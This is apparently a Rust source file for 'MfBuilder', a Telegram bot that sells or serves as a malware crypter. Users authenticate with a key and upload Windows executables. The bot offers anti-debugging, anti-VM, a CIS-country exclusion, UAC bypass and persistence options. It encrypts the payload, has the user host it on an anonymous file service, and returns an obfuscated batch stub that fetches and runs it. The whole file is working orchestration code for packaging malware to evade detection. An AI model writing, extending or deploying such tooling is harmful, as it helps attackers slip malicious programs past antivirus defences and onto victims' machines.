use std::collections::HashMap;
use std::fs;
use std::path::PathBuf;
use std::sync::Arc;
use tokio::sync::Mutex;
use teloxide::prelude::*;
use teloxide::types::{InputFile, MessageKind};
use serde::{Deserialize, Serialize};

mod binary_arch;
mod build_dotnet;
mod build_native;
mod builders;
mod crypto;
mod dir_utils;
mod mf_runner;
mod obf_batch;
mod random;
mod templates;

use binary_arch::BinaryArch;
use builders::{batch::BatchBuilder, exe::ExeBuilder};
use dir_utils::remove_dir_all;
use mf_runner::MfStubCS;

#[derive(Clone, Serialize, Deserialize)]
struct UserSession {
    user_id: i64,
    authenticated: bool,
    waiting_for_file: bool,
    waiting_for_upload_url: bool,
    anti_debug: bool,
    anti_vm: bool,
    blacklist_cis: bool,
    uac_bypass: bool,
    single_instance: bool,
    persistence: bool,
    payload_path: Option<String>,
    build_arch: Option<BinaryArch>,
    encrypted_payload_path: Option<String>,
    upload_url: Option<String>,
}

impl UserSession {
    fn new(user_id: i64) -> Self {
        Self {
            user_id,
            authenticated: false,
            waiting_for_file: false,
            waiting_for_upload_url: false,
            anti_debug: false,
            anti_vm: false,
            blacklist_cis: false,
            uac_bypass: false,
            single_instance: false,
            persistence: false,
            payload_path: None,
            build_arch: None,
            encrypted_payload_path: None,
            upload_url: None,
        }
    }
}

type Sessions = Arc<Mutex<HashMap<i64, UserSession>>>;

#[tokio::main]
async fn main() {
    dotenv::dotenv().ok();
    
    let bot_token = std::env::var("TELEGRAM_BOT_TOKEN")
        .expect("TELEGRAM_BOT_TOKEN must be set");
    let auth_key = std::env::var("AUTH_KEY")
        .expect("AUTH_KEY must be set");
    
    let bot = Bot::new(bot_token);
    let sessions: Sessions = Arc::new(Mutex::new(HashMap::new()));
    
    println!("MfBuilder Telegram Bot started!");
    
    let handler = dptree::entry()
        .branch(Update::filter_message().endpoint(handle_message))
        .branch(Update::filter_callback_query().endpoint(handle_callback));
    
    Dispatcher::builder(bot, handler)
        .dependencies(dptree::deps![sessions, auth_key])
        .enable_ctrlc_handler()
        .build()
        .dispatch()
        .await;
}

async fn handle_message(
    bot: Bot,
    msg: Message,
    sessions: Sessions,
    auth_key: String,
) -> ResponseResult<()> {
    let user_id = msg.chat.id;
    let mut sessions_lock = sessions.lock().await;
    
    if !sessions_lock.contains_key(&user_id) {
        sessions_lock.insert(user_id, UserSession::new(user_id));
    }
    
    let session = sessions_lock.get_mut(&user_id).unwrap();
    
    if !session.authenticated {
        if let Some(text) = msg.text() {
            if text == auth_key {
                session.authenticated = true;
                bot.send_message(msg.chat.id, "? Authentication successful!\n\nWould you like to crypt a binary? Send /crypt to start.")
                    .await?;
            } else {
                bot.send_message(msg.chat.id, "? Invalid key. Please provide a valid authentication key.")
                    .await?;
            }
        } else {
            bot.send_message(msg.chat.id, "?? Please provide your authentication key to continue.")
                .await?;
        }
        return Ok(());
    }
    
    if let Some(text) = msg.text() {
        match text {
            "/start" => {
                bot.send_message(msg.chat.id, "?? Welcome to MfBuilder!\n\nSend /crypt to start crypting a binary.")
                    .await?;
            }
            "/crypt" => {
                session.waiting_for_file = true;
                bot.send_message(msg.chat.id, "?? Please send me an EXE file to crypt.\n\n?? Only .exe files are supported!")
                    .await?;
            }
            "/settings" => {
                send_settings_keyboard(bot.clone(), msg.chat.id, session).await?;
            }
            "/build" => {
                if session.payload_path.is_none() {
                    bot.send_message(msg.chat.id, "? No payload file uploaded. Please send /crypt first.")
                        .await?;
                } else {
                    // If no upload URL, generate encrypted payload and send to user
                    if session.upload_url.is_none() {
                        bot.send_message(msg.chat.id, "?? Generating encrypted payload...")
                            .await?;
                        
                        match generate_encrypted_payload_for_user(session).await {
                            Ok(encrypted_path) => {
                                let file = InputFile::file(&encrypted_path);
                                bot.send_document(msg.chat.id, file).await?;
                                bot.send_message(msg.chat.id, "?? Please upload this file to a file hosting service (e.g., anonfile.la) and send me the direct download URL.")
                                    .await?;
                                session.waiting_for_upload_url = true;
                                session.encrypted_payload_path = Some(encrypted_path);
                            }
                            Err(e) => {
                                bot.send_message(msg.chat.id, format!("? Failed to generate encrypted payload: {}", e))
                                    .await?;
                            }
                        }
                    } else {
                        bot.send_message(msg.chat.id, "?? Starting build process... This may take a few minutes.")
                            .await?;
                        
                        match build_binary(session).await {
                            Ok(output_path) => {
                                let file = InputFile::file(output_path);
                                bot.send_document(msg.chat.id, file).await?;
                                bot.send_message(msg.chat.id, "? Build completed successfully!")
                                    .await?;
                                *session = UserSession::new(user_id);
                            }
                            Err(e) => {
                                bot.send_message(msg.chat.id, format!("? Build failed: {}", e))
                                    .await?;
                            }
                        }
                    }
                }
            }
            _ => {
                if session.waiting_for_upload_url && text.starts_with("http") {
                    session.upload_url = Some(text.to_string());
                    session.waiting_for_upload_url = false;
                    
                    match reqwest::get(&text).await {
                        Ok(resp) if resp.status().is_success() => {
                            bot.send_message(msg.chat.id, "? URL verified! Starting build process...")
                                .await?;
                            
                            // Automatically continue with build
                            match build_binary(session).await {
                                Ok(output_path) => {
                                    let file = InputFile::file(output_path);
                                    bot.send_document(msg.chat.id, file).await?;
                                    bot.send_message(msg.chat.id, "? Build completed successfully!")
                                        .await?;
                                    *session = UserSession::new(user_id);
                                }
                                Err(e) => {
                                    bot.send_message(msg.chat.id, format!("? Build failed: {}", e))
                                        .await?;
                                }
                            }
                        }
                        _ => {
                            bot.send_message(msg.chat.id, "? Invalid URL or failed to verify. Please provide a valid direct download link.")
                                .await?;
                        }
                    }
                } else {
                    bot.send_message(msg.chat.id, "? Unknown command. Use /start, /crypt, /settings, or /build")
                        .await?;
                }
            }
        }
    }
    
    if session.waiting_for_file {
        if let MessageKind::Common(ref common) = msg.kind {
            if let Some(document) = &common.media_kind.document() {
                let file_name = document.file_name.as_ref()
                    .map(|s| s.to_lowercase())
                    .unwrap_or_default();
                
                if !file_name.ends_with(".exe") {
                    bot.send_message(msg.chat.id, "? Only .exe files are supported!")
                        .await?;
                    return Ok(());
                }
                
                bot.send_message(msg.chat.id, "?? Downloading file...")
                    .await?;
                
                let file = bot.get_file(&document.file.id).await?;
                let file_path = file.path;
                
                let url = format!("https://api.telegram.org/file/bot{}/{}", 
                    bot.token(), file_path);
                let response = reqwest::get(&url).await?;
                let bytes = response.bytes().await?;
                
                let temp_dir = format!("temp_{}", user_id);
                fs::create_dir_all(&temp_dir)?;
                let payload_path = format!("{}/payload.exe", temp_dir);
                fs::write(&payload_path, bytes)?;
                
                let payload_bytes = fs::read(&payload_path)?;
                let build_arch = BinaryArch::determine(&payload_bytes);
                
                if build_arch == BinaryArch::Unknown {
                    bot.send_message(msg.chat.id, "? Failed to detect binary architecture. Only PE files are supported.")
                        .await?;
                    return Ok(());
                }
                
                session.payload_path = Some(payload_path);
                session.build_arch = Some(build_arch);
                session.waiting_for_file = false;
                
                bot.send_message(msg.chat.id, format!(
                    "? File uploaded successfully!\n\n?? Detected Architecture: {:?}\n\n?? Configure settings with /settings\n?? Build with /build",
                    build_arch
                )).await?;
                
                send_settings_keyboard(bot.clone(), msg.chat.id, session).await?;
            }
        }
    }
    
    Ok(())
}

async fn handle_callback(
    bot: Bot,
    q: CallbackQuery,
    sessions: Sessions,
) -> ResponseResult<()> {
    let user_id = q.from.id;
    let mut sessions_lock = sessions.lock().await;
    
    if let Some(session) = sessions_lock.get_mut(&user_id) {
        if let Some(data) = q.data {
            match data.as_str() {
                "toggle_anti_debug" => session.anti_debug = !session.anti_debug,
                "toggle_anti_vm" => session.anti_vm = !session.anti_vm,
                "toggle_blacklist_cis" => session.blacklist_cis = !session.blacklist_cis,
                "toggle_uac_bypass" => session.uac_bypass = !session.uac_bypass,
                "toggle_single_instance" => session.single_instance = !session.single_instance,
                "toggle_persistence" => session.persistence = !session.persistence,
                "build" => {
                    if session.payload_path.is_none() {
                        bot.answer_callback_query(q.id)
                            .text("No payload file uploaded")
                            .await?;
                        return Ok(());
                    }
                    
                    bot.answer_callback_query(q.id)
                        .text("Starting build...")
                        .await?;
                    
                    // If no upload URL, generate encrypted payload and send to user
                    if session.upload_url.is_none() {
                        bot.send_message(q.from.id, "?? Generating encrypted payload...")
                            .await?;
                        
                        match generate_encrypted_payload_for_user(session).await {
                            Ok(encrypted_path) => {
                                let file = InputFile::file(&encrypted_path);
                                bot.send_document(q.from.id, file).await?;
                                bot.send_message(q.from.id, "?? Please upload this file to a file hosting service (e.g., anonfile.la) and send me the direct download URL.")
                                    .await?;
                                session.waiting_for_upload_url = true;
                                session.encrypted_payload_path = Some(encrypted_path);
                                return Ok(());
                            }
                            Err(e) => {
                                bot.send_message(q.from.id, format!("? Failed to generate encrypted payload: {}", e))
                                    .await?;
                                return Ok(());
                            }
                        }
                    }
                    
                    bot.send_message(q.from.id, "?? Starting build process... This may take a few minutes.")
                        .await?;
                    
                    match build_binary(session).await {
                        Ok(output_path) => {
                            let file = InputFile::file(output_path);
                            bot.send_document(q.from.id, file).await?;
                            bot.send_message(q.from.id, "? Build completed successfully!")
                                .await?;
                            *session = UserSession::new(user_id);
                        }
                        Err(e) => {
                            bot.send_message(q.from.id, format!("? Build failed: {}", e))
                                .await?;
                        }
                    }
                    return Ok(());
                }
                _ => {}
            }
            
            bot.answer_callback_query(q.id).await?;
            send_settings_keyboard(bot, user_id, session).await?;
        }
    }
    
    Ok(())
}

async fn send_settings_keyboard(bot: Bot, chat_id: ChatId, session: &UserSession) -> ResponseResult<()> {
    let keyboard = teloxide::types::InlineKeyboardMarkup::new(vec![
        vec![teloxide::types::InlineKeyboardButton::callback(
            format!("Anti Debug: {}", if session.anti_debug { "? ON" } else { "? OFF" }),
            "toggle_anti_debug"
        )],
        vec![teloxide::types::InlineKeyboardButton::callback(
            format!("Anti VM: {}", if session.anti_vm { "? ON" } else { "? OFF" }),
            "toggle_anti_vm"
        )],
        vec![teloxide::types::InlineKeyboardButton::callback(
            format!("Blacklist CIS: {}", if session.blacklist_cis { "? ON" } else { "? OFF" }),
            "toggle_blacklist_cis"
        )],
        vec![teloxide::types::InlineKeyboardButton::callback(
            format!("UAC Bypass: {}", if session.uac_bypass { "? ON" } else { "? OFF" }),
            "toggle_uac_bypass"
        )],
        vec![teloxide::types::InlineKeyboardButton::callback(
            format!("Single Instance: {}", if session.single_instance { "? ON" } else { "? OFF" }),
            "toggle_single_instance"
        )],
        vec![teloxide::types::InlineKeyboardButton::callback(
            format!("Persistence: {}", if session.persistence { "? ON" } else { "? OFF" }),
            "toggle_persistence"
        )],
        vec![teloxide::types::InlineKeyboardButton::callback("?? Build", "build")],
    ]);
    
    bot.send_message(chat_id, "?? Configure build settings:").reply_markup(keyboard).await?;
    Ok(())
}

// Helper structs matching main.rs
#[derive(PartialEq, Clone)]
enum SupportedFileExtension {
    BAT,
    EXE,
    UNKNOWN
}

impl SupportedFileExtension {
    pub fn from_str(s: &str) -> SupportedFileExtension {
        match s {
            "BAT" => Self::BAT,
            "EXE" => Self::EXE,
            _ => Self::UNKNOWN
        }
    }
}

struct MfBuilder {
    build_arch: BinaryArch,
    anti_debug: bool,
    anti_virtual_machine: bool,
    blacklist_cis_countries: bool,
    uac_bypass: bool,
    single_instance: bool,
    run_on_startup: bool,
    bind_file: bool,
    file_extension: SupportedFileExtension,
    payload_bytes: Vec<u8>,
    binder_file_bytes: Vec<u8>,
}

async fn generate_encrypted_payload_for_user(session: &mut UserSession) -> Result<String, Box<dyn std::error::Error>> {
    use std::fs;
    use serde_json::Value;
    
    let payload_path = session.payload_path.as_ref().ok_or("No payload path")?;
    let build_arch = session.build_arch.ok_or("No build architecture detected")?;
    
    // Copy payload to current directory
    fs::copy(payload_path, "payload.exe")?;
    
    // Create MfBuilder struct
    let mut build_config = MfBuilder {
        build_arch: build_arch.clone(),
        anti_debug: session.anti_debug,
        anti_virtual_machine: session.anti_vm,
        blacklist_cis_countries: session.blacklist_cis,
        uac_bypass: session.uac_bypass,
        single_instance: session.single_instance,
        run_on_startup: session.persistence,
        bind_file: false,
        file_extension: SupportedFileExtension::BAT,
        payload_bytes: Vec::new(),
        binder_file_bytes: Vec::new(),
    };
    
    let mut stub = MfStubCS::new();
    stub.init_keys();
    
    // Generate encrypted payload based on architecture
    let encrypted_path = if build_arch == BinaryArch::X64 || build_arch == BinaryArch::X86 {
        build_native::generate_encrypted_shellcode(&mut build_config, &mut stub)?
    } else {
        build_dotnet::generate_encrypted_payload(&mut stub)?
    };
    
    Ok(encrypted_path)
}

async fn build_binary(session: &UserSession) -> Result<String, Box<dyn std::error::Error>> {
    use serde_json::Value;
    
    let payload_path = session.payload_path.as_ref().ok_or("No payload path")?;
    let build_arch = session.build_arch.ok_or("No build architecture detected")?;
    
    // Create build.json
    let build_config_json = serde_json::json!({
        "file_extension": "BAT", // Use BAT for now since EXE builder is empty
        "anti_debug": session.anti_debug,
        "anti_virtual_machine": session.anti_vm,
        "blacklist_cis_countries": session.blacklist_cis,
        "uac_bypass": session.uac_bypass,
        "single_instance": session.single_instance,
        "run_on_startup": session.persistence,
        "binder": false
    });
    
    fs::write("build.json", serde_json::to_string_pretty(&build_config_json)?)?;
    
    // Copy payload to current directory
    fs::copy(payload_path, "payload.exe")?;
    
    // Parse config
    let config: Value = serde_json::from_str(&fs::read_to_string("build.json")?)?;
    let config = config.as_object().ok_or("Invalid config")?;
    
    // Create MfBuilder struct
    let mut build_config = MfBuilder {
        build_arch: build_arch.clone(),
        anti_debug: session.anti_debug,
        anti_virtual_machine: session.anti_vm,
        blacklist_cis_countries: session.blacklist_cis,
        uac_bypass: session.uac_bypass,
        single_instance: session.single_instance,
        run_on_startup: session.persistence,
        bind_file: false,
        file_extension: SupportedFileExtension::BAT,
        payload_bytes: Vec::new(),
        binder_file_bytes: Vec::new(),
    };
    
    let mut stub = MfStubCS::new();
    stub.init_keys();
    if session.persistence {
        stub.init_persistance();
    }
    
    // Build based on architecture and handle encrypted payload generation
    let input_url = if build_arch == BinaryArch::X64 || build_arch == BinaryArch::X86 {
        build_native::build_native_stage_with_url(&mut build_config, &mut stub, session.upload_url.clone())
    } else {
        build_dotnet::build_dotnet_stage_with_url(&mut build_config, &mut stub, session.upload_url.clone())
    };
    
    stub.init_payload(input_url);
    stub.set_symbols(&build_config);
    
    if !stub.ms_build(build_arch) {
        return Err("Failed to build MfRunner".into());
    }
    
    let _ = remove_dir_all(&stub.working_directory, &stub.working_directory);
    stub.obfuscate_mf_runner();
    
    // Build final file
    BatchBuilder::build(&stub);
    
    Ok("stub.bat".to_string())
}
